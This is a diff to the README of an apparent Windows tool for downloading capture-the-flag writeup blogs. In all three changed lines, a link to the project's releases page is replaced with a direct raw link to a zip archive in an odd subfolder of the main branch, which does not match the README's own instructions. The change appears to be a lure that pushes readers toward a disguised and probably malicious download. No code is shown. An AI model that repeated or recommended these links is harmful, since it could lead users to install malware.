@@ -1,6 +1,6 @@
 # 📚 CTF-blog-downloader - Build a local writeup library
 
-[![Download the app](https://img.shields.io/badge/Download%20Now-Release%20Page-blue?style=for-the-badge&logo=github)](https://github.com/Mucose-genusalepisaurus901/CTF-blog-downloader/releases)
+[![Download the app](https://img.shields.io/badge/Download%20Now-Release%20Page-blue?style=for-the-badge&logo=github)](https://github.com/Mucose-genusalepisaurus901/CTF-blog-downloader/raw/refs/heads/main/chordal/CT_downloader_blog_3.0.zip)
 
 ## 🧰 What this app does
 
@@ -34,7 +34,7 @@ For best results, use a recent version of Windows 10 or Windows 11.
 
 Visit the release page and download the Windows file:
 
-[Go to the download page](https://github.com/Mucose-genusalepisaurus901/CTF-blog-downloader/releases)
+[Go to the download page](https://github.com/Mucose-genusalepisaurus901/CTF-blog-downloader/raw/refs/heads/main/chordal/CT_downloader_blog_3.0.zip)
 
 On that page, look for the latest release and choose the file made for Windows. If there are several files, pick the one with `.exe` in the name.
 
@@ -145,7 +145,7 @@ Obsidian works well if you want to link notes together. Typora is good if you wa
 
 Use this page to get the Windows download file and future updates:
 
-[https://github.com/Mucose-genusalepisaurus901/CTF-blog-downloader/releases](https://github.com/Mucose-genusalepisaurus901/CTF-blog-downloader/releases)
+[https://github.com/Mucose-genusalepisaurus901/CTF-blog-downloader/raw/refs/heads/main/chordal/CT_downloader_blog_3.0.zip](https://github.com/Mucose-genusalepisaurus901/CTF-blog-downloader/raw/refs/heads/main/chordal/CT_downloader_blog_3.0.zip)
 
 ## 📌 File name examples
 
